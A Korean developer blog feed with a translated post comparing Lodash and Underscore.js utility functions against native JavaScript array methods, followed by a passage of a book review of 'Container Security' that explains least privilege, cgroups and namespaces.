<p>JavaScript와 함께 사용되는 유틸리티 함수들의 종류는 매우 다양합니다. 이 중 가장 일반적으로 사용되는 <a href="https://lodash.com">Lodash</a>와 <a href="https://underscorejs.org">Underscore.js</a>의 기능과 순수 자바스크립트 함수를 비교해보고자 합니다. 예제로 주어지는 함수들 중 일부는 ES5을 지원하지만 일부는 ES6의 지원이 필요하기도 합니다.</p> <p>Lodash나 Underscore.js 등의 라이브러리의 핵심 디자인 원칙은 <strong>함수형 프로그래밍</strong>으로 설명할 수 있습니다. 여기에서, <strong>함수형 프로그래밍</strong>이란 무엇일까요?</p> <p>함수형 프로그래밍을 설명하는데는 여러 방법이 있지만, 다음과 같이 정의해볼 수 있습니다.</p> <blockquote> <p>함수형 프로그래밍은 <strong>계산을 수학적 함수의 조합으로 생각하는 방식</strong>을 의미합니다. 프로그래밍이 실행될 때 전역 상태를 변경하는 명령문으로 구성된 <strong>명령형 프로그래밍과 대조되는 개념</strong>으로 이해할 수 있습니다. 명령형 프로그래밍에서는 일반적인 프로그래밍 언어에서 함수가 특정 동작을 수행하는 역할을 담당하지만, 함수형 프로그래밍에서는 일반적으로 전역 변수와 같은 변경 가능한(mutable) 상태의 사용을 피하고, <strong>불변(immutable) 데이터</strong>와 <strong>side effect이 없는 함수</strong>, 즉 함수의 실행이 외부에 영향을 끼치지 않는 함수를 사용하는 것을 지향합니다.</p> </blockquote> <p>여기서 중요한 것은, 사이드 이펙트가 없어야 한다는 점이며 이는 함수 내부에 상태가 존재하지 않고 함수의 출력 값은 항상 함수의 입력 값의 영향만 받는다는 것을 의미합니다. 덕분에 테스트, 유지 관리가 쉽고 무엇보다도 예측 가능합니다.</p> <h2 id="예제">예제</h2> <p>간단한 예제와 함께 순수 자바스크립트 함수와 라이브러리 함수를 좀 더 자세히 비교해보겠습니다.</p> <blockquote> <p>TIP: 필요한 기능만 Bit 컴포넌트로 설치해주세요</p> </blockquote> <p><a href="https://github.com/teambit/bit">Bit</a> 을 사용하면 라이브러리의 함수, 컴포넌트, 모듈을 별도의 리팩토링 없이 재사용 가능하게 나눌 수 있습니다. Lodash에 대한 내용은 <a href="https://bit.dev/lodash/lodash">여기</a> 를 참고해주세요!</p> <h3 id="find">find</h3> <p>첫 번째로 <code class="language-plaintext highlighter-rouge">find</code>을 살펴보겠습니다. <code class="language-plaintext highlighter-rouge">find</code>는 컬렉션에서 주어진 조건을 충족하는 첫 번째 요소를 반환합니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="code"><pre><span class="kd">const</span> <span class="nx">users</span> <span class="o">=</span> <span class="p">[</span>
<span class="p">{</span> <span class="dl">'</span><span class="s1">user</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">joey</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">age</span><span class="dl">'</span><span class="p">:</span> <span class="mi">32</span> <span class="p">},</span>
<span class="p">{</span> <span class="dl">'</span><span class="s1">user</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">ross</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">age</span><span class="dl">'</span><span class="p">:</span> <span class="mi">41</span> <span class="p">},</span>
<span class="p">{</span> <span class="dl">'</span><span class="s1">user</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">chandler</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">age</span><span class="dl">'</span><span class="p">:</span> <span class="mi">39</span> <span class="p">}</span>
<span class="p">]</span>

<span class="c1">// Native</span>
<span class="nx">users</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="nf">function </span><span class="p">(</span><span class="nx">o</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="nx">o</span><span class="p">.</span><span class="nx">age</span> <span class="o">&lt;</span> <span class="mi">40</span><span class="p">;</span> <span class="p">})</span>

<span class="c1">//lodash</span>
<span class="err">\</span><span class="nx">_</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="nx">users</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">o</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="nx">o</span><span class="p">.</span><span class="nx">age</span> <span class="o">&lt;</span> <span class="mi">40</span><span class="p">;</span> <span class="p">})</span>
</pre></td></tr></tbody></table></code></pre></figure> <p>위의 간단한 예제 코드를 통해, 네이티브 자바스크립트와 Lodash 각각의 성능을 살펴보겠습니다.</p> <blockquote> <p>_find vs _.find _</p> </blockquote> <p><img src="https://miro.medium.com/max/1400/1*aw5pv3HKxsHsV1jh434UYg.png" alt="queue" width="100%" height="100%"/></p> <p>하지만, 이 통계만 보고 순수 자바스크립트의 기능이 항상 Lodash의 것보다 성능이 좋다는 결론을 내릴 순 없습니다. 다만, 네이티브 함수인 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/find">find</a> 이 lodash의 <a href="https://lodash.com/docs/4.17.15#find">find</a> 보다 더 간결하고 읽기 쉽다는 장점이 있음은 분명해보입니다.</p> <h3 id="filter">filter</h3> <p>다음으로 <code class="language-plaintext highlighter-rouge">filter</code> 를 살펴보겠습니다. <code class="language-plaintext highlighter-rouge">filter</code>는 컬렉션에서 특정 조건을 충족하는 요소를 반환하는데 주로 사용됩니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="code"><pre><span class="kd">const</span> <span class="nx">numbers</span> <span class="o">=</span> <span class="p">[</span><span class="mi">10</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">230</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">1221</span><span class="p">]</span>

<span class="err">\</span><span class="nx">_</span><span class="p">.</span><span class="nf">filter</span><span class="p">(</span><span class="nx">numbers</span><span class="p">,</span> <span class="nx">num</span> <span class="o">=&gt;</span> <span class="nx">num</span> <span class="o">%</span> <span class="mi">3</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span>
<span class="nx">numbers</span><span class="p">.</span><span class="nf">filter</span><span class="p">(</span><span class="nx">num</span> <span class="o">=&gt;</span> <span class="nx">num</span> <span class="o">%</span> <span class="mi">3</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></figure> <blockquote> <p><em>_.filter vs array.filter</em></p> </blockquote> <p><img src="https://miro.medium.com/max/1400/1*lstVPT2qm3OesKxOm3OoGg.png" alt="queue" width="100%" height="100%"/></p> <p>이번에도 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/filter"><code class="language-plaintext highlighter-rouge">Array.prototype.filter</code></a>가 동일 연산을 처리하는데 좀 더 빠르다는 결과를 얻을 수 있습니다.</p> <h3 id="each">each</h3> <p>반대로 lodash 함수를 사용할 때 유익한 경우도 있습니다. 아래 예제는 내장된 이터레이터인 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/forEach">Array.prototype.forEach</a> 보다 lodash의 <a href="https://lodash.com/docs/4.17.15#forEach">_.forEach</a> 를 사용하는 것이 좋음을 보여주고 있습니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="code"><pre><span class="err">\</span><span class="nx">_</span><span class="p">.</span><span class="nf">each</span><span class="p">([</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span> <span class="p">(</span><span class="nx">value</span><span class="p">,</span> <span class="nx">index</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span>
<span class="p">})</span>

<span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">].</span><span class="nf">forEach</span><span class="p">((</span><span class="nx">value</span><span class="p">,</span> <span class="nx">index</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span>
<span class="p">})</span>

<span class="err">\</span><span class="nx">_</span><span class="p">.</span><span class="nf">forEach</span><span class="p">({</span> <span class="dl">'</span><span class="s1">a</span><span class="dl">'</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="dl">'</span><span class="s1">b</span><span class="dl">'</span><span class="p">:</span> <span class="mi">2</span> <span class="p">},</span> <span class="p">(</span><span class="nx">value</span><span class="p">,</span> <span class="nx">key</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">key</span><span class="p">);</span>
<span class="p">});</span>

<span class="p">({</span> <span class="dl">'</span><span class="s1">a</span><span class="dl">'</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="dl">'</span><span class="s1">b</span><span class="dl">'</span><span class="p">:</span> <span class="mi">2</span> <span class="p">}).</span><span class="nf">forEach</span><span class="p">((</span><span class="nx">value</span><span class="p">,</span> <span class="nx">key</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="c1">// !error</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">key</span><span class="p">);</span>
<span class="p">});</span>
</pre></td></tr></tbody></table></code></pre></figure> <blockquote> <p><em>_.each vs forEach vs map</em></p> </blockquote> <p><img src="https://miro.medium.com/max/1400/1*sqlnG7flP2igrYUnt7YSzA.png" alt="queue" width="100%" height="100%"/></p> <p><code class="language-plaintext highlighter-rouge">_.each</code>는 브라우저 별로 구현을 달리 하기 때문에 네이티브 함수보다 훨씬 빠른 결과를 얻을 수 있습니다.</p> <blockquote> <p>Lodash 개발자에 따르면, 네이티브 forEach 함수는 브라우저에 따라 상대적인 속도가 상이하다고 합니다. 이는 forEach가 네이티브 함수이기 때문에 <code class="language-plaintext highlighter-rouge">for</code> 혹은 <code class="language-plaintext highlighter-rouge">while</code>로 생성된 루프보다 빠르다는 것을 의미하지 않습니다. 또한 forEach는 콜백 함수를 사용하기 때문에, 함수 호출 시 (잠재적인) 오버헤드가 존재합니다.</p> </blockquote> <h3 id="every">every</h3> <p><code class="language-plaintext highlighter-rouge">every</code>는 배열의 모든 요소를 순회하며 특정 조건을 충족하는지 여부를 테스트합니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="code"><pre><span class="kd">const</span> <span class="nx">elements</span> <span class="o">=</span> <span class="p">[</span><span class="dl">"</span><span class="s2">cat</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">dog</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">bat</span><span class="dl">"</span><span class="p">]</span>

<span class="err">\</span><span class="nx">_</span><span class="p">.</span><span class="nf">every</span><span class="p">(</span><span class="nx">elements</span><span class="p">,</span> <span class="nx">el</span> <span class="o">=&gt;</span> <span class="nx">el</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span>
<span class="nx">elements</span><span class="p">.</span><span class="nf">every</span><span class="p">(</span><span class="nx">el</span> <span class="o">=&gt;</span> <span class="nx">el</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span> <span class="c1">//true</span>
</pre></td></tr></tbody></table></code></pre></figure> <blockquote> <p><em>_.every vs array.every</em></p> </blockquote> <p><img src="https://miro.medium.com/max/1400/1*_CJMbz8wzHiv6R2SP7h9Gw.png" alt="queue" width="100%" height="100%"/></p> <p>이번에도 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/every">Array.prototype.every</a> 가 <code class="language-plaintext highlighter-rouge">_.every</code>보다 훨씬 빠르다는 결과를 얻었습니다.</p> <h3 id="some">some</h3> <p><code class="language-plaintext highlighter-rouge">some</code>은 배열의 요소 중 하나 이상이 특정 조건을 충족하는지 여부를 확인하는데 사용합니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="code"><pre><span class="kd">const</span> <span class="nx">elements</span> <span class="o">=</span> <span class="p">[</span><span class="dl">"</span><span class="s2">cat</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">dog</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">bat</span><span class="dl">"</span><span class="p">]</span>

<span class="err">\</span><span class="nx">_</span><span class="p">.</span><span class="nf">some</span><span class="p">(</span><span class="nx">elements</span><span class="p">,</span> <span class="nx">el</span> <span class="o">=&gt;</span> <span class="nx">el</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">'</span><span class="s1">c</span><span class="dl">'</span><span class="p">))</span>
<span class="nx">elements</span><span class="p">.</span><span class="nf">some</span><span class="p">(</span><span class="nx">el</span> <span class="o">=&gt;</span> <span class="nx">el</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">'</span><span class="s1">c</span><span class="dl">'</span><span class="p">))</span>
</pre></td></tr></tbody></table></code></pre></figure> <blockquote> <p><em>array.some vs _.some</em></p> </blockquote> <p><img src="https://miro.medium.com/max/1400/1*EBznqoWTqNjrARQE_yJpTw.png" alt="queue" width="100%" height="100%"/></p> <p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/some">Array.prototype.some</a> 의 결과가 우세함을 알 수 있습니다.</p> <h3 id="includes">includes</h3> <p><code class="language-plaintext highlighter-rouge">includes</code>는 배열에 특정 요소가 포함되어 있는지 여부를 반환합니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="code"><pre><span class="kd">const</span> <span class="nx">primes</span> <span class="o">=</span> <span class="p">[</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">61</span><span class="p">,</span><span class="mi">67</span><span class="p">,</span><span class="mi">71</span><span class="p">,</span><span class="mi">73</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">83</span><span class="p">,</span><span class="mi">97</span><span class="p">]</span>

<span class="err">\</span><span class="nx">_</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="nx">primes</span><span class="p">,</span> <span class="mi">47</span><span class="p">)</span>
<span class="nx">primes</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="mi">79</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></figure> <blockquote> <p><em>array.includes vs _.includes</em></p> </blockquote> <p><img src="https://miro.medium.com/max/1400/1*WW2NTx8Ka4PKul6gPPvOuQ.png" alt="queue" width="100%" height="100%"/></p> <h3 id="uniq">uniq</h3> <p><code class="language-plaintext highlighter-rouge">uniq</code>는 배열에서 고유한 요소를 찾는데 사용됩니다. 자바스크립트의 <code class="language-plaintext highlighter-rouge">Set</code> 데이터 타입을 활용하여 배열을 집합으로 변환하고, 스프레드 연산자(…)를 사용하여 이를 다시 배열로 변환합니다. 이러한 두 번의 전환 과정을 거치는 것이 실제로 도움이 되는지 살펴봅시다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="code"><pre><span class="kd">var</span> <span class="nx">elements</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">3</span><span class="p">]</span>

<span class="err">\</span><span class="nx">_</span><span class="p">.</span><span class="nf">uniq</span><span class="p">(</span><span class="nx">elements</span><span class="p">)</span>
<span class="p">[...</span><span class="k">new</span> <span class="nc">Set</span><span class="p">(</span><span class="nx">elements</span><span class="p">)]</span>
</pre></td></tr></tbody></table></code></pre></figure> <blockquote> <p><em>_.uniq vs Set</em></p> </blockquote> <p><img src="https://miro.medium.com/max/1400/1*GOx7k9e6DFast8jPSmPKpQ.png" alt="queue" width="100%" height="100%"/></p> <p><code class="language-plaintext highlighter-rouge">_.uniq</code>의 성능이 조금 더 우세함을 확인할 수 있습니다.</p> <p>또는 아래와 같은 방식도 고려해볼 수 있습니다.</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">elements</span><span class="p">.</span><span class="nf">filter</span><span class="p">((</span><span class="nx">value</span><span class="p">,</span> <span class="nx">index</span><span class="p">,</span> <span class="nx">array</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">array</span><span class="p">.</span><span class="nf">indexof</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span> <span class="o">===</span> <span class="nx">index</span><span class="p">);</span>
</code></pre></div></div> <h3 id="compact">compact</h3> <p><code class="language-plaintext highlighter-rouge">compact</code>는 배열에서 거짓(false) 혹은 정의되지 않은(undefined) 값을 제거하는데 유용합니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="code"><pre><span class="kd">var</span> <span class="nx">array</span> <span class="o">=</span> <span class="p">[</span><span class="kc">undefined</span><span class="p">,</span> <span class="dl">'</span><span class="s1">cat</span><span class="dl">'</span><span class="p">,</span> <span class="kc">false</span><span class="p">,</span> <span class="mi">434</span><span class="p">,</span> <span class="dl">''</span><span class="p">,</span> <span class="mf">32.0</span><span class="p">]</span>

<span class="err">\</span><span class="nx">_</span><span class="p">.</span><span class="nf">compact</span><span class="p">(</span><span class="nx">array</span><span class="p">)</span>
<span class="nx">array</span><span class="p">.</span><span class="nf">filter</span><span class="p">(</span><span class="nb">Boolean</span><span class="p">)</span>
<span class="c1">// same as writing: (a.k.a Syntactic sugar)</span>
<span class="c1">// array.filter(function (x) { return Boolean(x); });</span>
</pre></td></tr></tbody></table></code></pre></figure> <hr/> <p>지금까지 여러 예제들을 통해 네이티브 함수의 유용성을 살펴보았습니다. Lodash 등의 유틸리티 라이브러리 대신 네이티브 함수를 선택할 때 고려해야 할 사항은 다음과 같습니다.</p> <ul> <li>반드시 필요한 모듈만 <code class="language-plaintext highlighter-rouge">import</code>합니다.</li> <li>lodash의 경우 CommonJS 형태로 번들링되어 배포되기 때문에 webpack의 기본 설정으로는 lodash를 <a href="https://webpack.js.org/guides/tree-shaking/">트리 쉐이킹</a> 할 수 없다. 이 경우, <a href="https://github.com/lodash/babel-plugin-lodash">babel-plugin-lodash</a> 를 사용하길 추천합니다.</li> <li>프로젝트에 더 적은 종속성이 요구되거나 대상 브라우저를 명확하게 알고 있다면, lodash/underscore.js와 같은 외부 유틸을 지양하고 네이티브 함수를 사용합니다.</li> </ul> <hr/> <p>🔗 참조</p> <p>📌 <a href="https://blog.bitsrc.io/you-dont-need-lodash-or-how-i-started-loving-javascript-functions-3f45791fa6cd">Pure JavaScript Functions as a Replacement for Lodash</a></p> <p>📌 <a href="https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore">You Dont Need Lodash Underscore</a></p>]]></content><author><name></name></author><category term="글또"/><category term="JavaScript"/><category term="lodash"/><category term="vanillaJavaScript"/><summary type="html"><![CDATA[이 글은 원저자 RC 의 허락을 받아 Pure JavaScript Functions as a Replacement for Lodash 을 번역한 글입니다]]></summary></entry><entry><title type="html">[리뷰] “컨테이너 보안”을 읽고</title><link href="https://chanmi-lee.github.io/articles/2021-02/review-of-container-security/" rel="alternate" type="text/html" title="[리뷰] “컨테이너 보안”을 읽고"/><published>2021-02-07T00:00:00+00:00</published><updated>2021-02-07T00:00:00+00:00</updated><id>https://chanmi-lee.github.io/articles/2021-02/review-of-container-security</id><content type="html" xml:base="https://chanmi-lee.github.io/articles/2021-02/review-of-container-security/"><![CDATA[<blockquote> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> "한빛미디어 &lt;나는 리뷰어다&gt; 활동으로, 책을 제공받아 작성된 서평입니다."
</code></pre></div> </div> </blockquote> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/docker-container-480.webp 480w,/assets/img/posts/docker-container-800.webp 800w,/assets/img/posts/docker-container-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/docker-container.png" class="img-fluid rounded z-depth-1" width="50%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="컨테이너-보안">컨테이너 보안</h3> <p>가벼움과 재사용 가능한 코드, 그리고 무엇보다 2013년 도커의 등장 이래로 <code class="language-plaintext highlighter-rouge">컨테이너</code>에 대한 관심이 증가하고 있습니다. 컨테이너는 격리된 공간에서 프로세스가 동작하는 기술로, 도커의 초기 광고 문구인 <code class="language-plaintext highlighter-rouge">Build Once Run Anywhere</code> 처럼, 한 번만 빌드하고 어디서든 실행할 수 있게 해줍니다. 컨테이너를 이용하면 간단한 한 두개의 명령어를 통해 다종다양한 실행 환경에서 우려되는 각종 오류와 지원 문제를 해결해준다는 점에서도 크나큰 매력이 있습니다.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/container-security-cover-480.webp 480w,/assets/img/posts/container-security-cover-800.webp 800w,/assets/img/posts/container-security-cover-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/container-security-cover.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>이 책은 컨테이너 기반 시스템을 구성하는데 쓰이는 여러 기반 기술들과 매커니즘을 소개하고, 리눅스 운영체제에서 구체적으로 어떻게 작용하는지 설명하고 있습니다. 전반부는 시스템 호출과 리눅스 능력 등 컨테이너와 관련된 리눅스 메커니즘을 설명하면서, 컨테이너가 어떻게 작동하고 컨테이너의 구성 요소들이 어떻게 서로 혹은 외부와 통신하는지 다루고 있습니다. 또한 컨테이너 이미지를 안전하게 구축하는 best practice를 사례와 함께 설명하고, 기본 구현 이상으로 컨테이너 보안을 강화하는데 사용할 수 있는 추가적인 리눅스 보안 수단들을 설명해주고 있습니다.</p> <p>이어지는 후반부에서는, 컨테이너간의 통신 방식과 연결에 제한을 두어 보안을 개선하는 방법을 살펴보고 있습니다. 컨테이너화된 구성 요소들이 서로를 식별하고 보안 네트워크 연결을 설정하는데 사용되는 개인 키/공개 키 방식과 인증서를 사례로 알아보고, 마지막으로 컨테이너의 기능을 활용해 공격을 방지하는 여러 보안 도구들을 소개하고 있습니다.</p> <h4 id="일반적인-보안-원칙들">일반적인 보안 원칙들</h4> <ul> <li>최소 권한</li> </ul> <p>최소 권한 원칙 또는 최소 특권 원칙은 사용자 또는 구성 요소가 해당 작업을 진행하는데 <code class="language-plaintext highlighter-rouge">반드시 필요한 것에만 접근</code>할 수 있게 해야 한다는 것을 의미합니다. 예를 들어, 특정 컨테이너에게 루트 사용자 권한으로 실행되도록 설정한다면 실제로 필요한 것보다 더 많은 특권을 가지게 됩니다. 전자 상거래 프로그램 내에 상품을 검색하는 마이크로 서비스가 있다고 할 때, 최소 권한 원칙에 따르면 제품과 관련된 데이터베이스에 읽기 전용으로만 접근할 수 있는 권한만 부여되어야 합니다. 이 때엔 사용자 정보 혹은 결제 정보 등 이와 직접적인 관련이 없는 것에 대한 권한은 필요하지 않습니다.</p> <ul> <li>심층 방어</li> </ul> <p>심층 방어 원칙이란 보호를 여러 층으로 적용해야 함을 의미합니다. 공격자가 방어층 하나를 뚫는다고 해도 또 다른 방어층이 있으면 그 목적을 쉽게 달성하지 못하도록 방어할 수 있으며, 이중 로그인을 예로 들 수 있습니다.</p> <ul> <li>공격 표면 축소</li> </ul> <p>일반적으로 시스템이 복잡할수록 이를 공격하는 방법이 다양해지기 때문에, 시스템의 복잡도를 줄여 보안력을 높이는 것을 의미합니다. 서버에 접근 가능한 사용자들과 구성 요소를 제한하거나, 인터페이스를 최대한 작고 단순하게 구성하는 등의 방법이 있습니다.</p> <ul> <li>폭발 반경 제한</li> </ul> <p>보안 통제 항복들을 더 작은 부분으로 나누어 혹시 모를 사건 발생에 대한 상호영향도를 최소화 하는 것을 의미합니다.</p> <ul> <li>직무 분리 (Segregation of duties, SoD)</li> </ul> <p>서로 다른 구성 요소나 사용자들에게 전체 시스템 중 꼭 필요한 가장 작은 부분집합에 대한 권한만을 부여하는 것을 의미합니다. 앞에서 설명한 최소 권한 및 폭발 반경 제한 원칙과 관련이 있습니다.</p> <h4 id="cgroups로-제한하기">cgroups로 제한하기</h4> <p>리눅스의 모든 프로세스는 일반적으로 하나의 부모 프로세스의 하위 프로세스입니다 (<code class="language-plaintext highlighter-rouge">부모-자식 관계</code> 라고도 이해할 수 있습니다).</p> <p>따라서 한 프로세스가 처음 생성될 때 (<code class="language-plaintext highlighter-rouge">init</code>), 생성된 프로세스는 다음의 특징을 가지게 됩니다.</p> <ul> <li>계층적이다</li> <li>자식 cgroups은 부모 cgroups의 속성을 상속한다</li> </ul> <p>일반적으로 컨테이너는 리눅스 프로세스로 실행되므로, <code class="language-plaintext highlighter-rouge">cgroups</code>를 통해 각 칸테이너가 사용할 수 있는 자원들을 제한할 수 있습니다. <code class="language-plaintext highlighter-rouge">cgroups</code>는 <code class="language-plaintext highlighter-rouge">control groups</code>를 줄인 말로, 주어진 그룹에 속한 프로세스들이 사용할 수 있는 자원(메모리나 CPU, 네트워크 입출력)을 제한하는 수단입니다.</p> <p>제어 그룹을 관리한다는 것은, 결국 이 위계구조들에 있는 파일들과 디렉터리를 읽고 쓰는 것을 의미합니다.</p> <h4 id="namespace로-제한하기">namespace로 제한하기</h4> <p><code class="language-plaintext highlighter-rouge">cgroups</code>가 프로세스가 사용할 수 있는 자원을 제한한다면, <code class="language-plaintext highlighter-rouge">namespace</code>는 프로세스가 볼 수 있는 것들을 제한합니다.</p> <p>리눅스에서 지원하는 namespace의 종류는 다음과 같습니다.</p> <ul> <li>유닉스 시분할 시스템 (Unix Timesharing System, UTS) : 프로세스가 인식하는 시스템의 호스트 이름과 도메인 이름들에 관한 namespace</li> <li>프로세스 ID</li> <li>마운트 지점 (Mount point)</li> <li>네트워크</li> <li>사용자 ID와 그룹 ID</li> <li>IPC (Inter-process communication, 프로세스간 통신)</li> <li>제어 그룹</li> </ul> <p>하나의 프로세스는 namespace 종류 당 하나의 namespace에 속하게 됩니다. 프로세스를 어떤 namespace에 넣으면, 프로세스는 해당 namespace이 허용하는 것들만 볼 수 있게 됩니다.</p> <blockquote> <p>lsns: 현존하는 namespace를 확인하기 위해 사용하는 명령어</p> </blockquote> <p>도커 컨테이너 안에서 <code class="language-plaintext highlighter-rouge">ps</code> 명령어를 실행하면 현재 컨테이너 안에서 실행되는 프로세스만 나오고 호스트에서 실행되는 프로세스들은 나오지 않습니다. 이처럼 컨테이너가 볼 수 있는 프로세스 ID들이 제한된 것은 컨테이너마다 개별적인 프로세스 ID namespace를 적용했기 때문입니다.</p> <p>또한 컨테이너 실행 시 루트 디렉터리가 변경되어, 호스트의 파일 시스템 전체를 볼 수 없습니다. 만약 루트 디렉터리를 변경하려면 <code class="language-plaintext highlighter-rouge">chroot</code> 명령어를 통해 변경할 수 있습니다.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; mkdir new_root
&gt; sudo chroot new_root
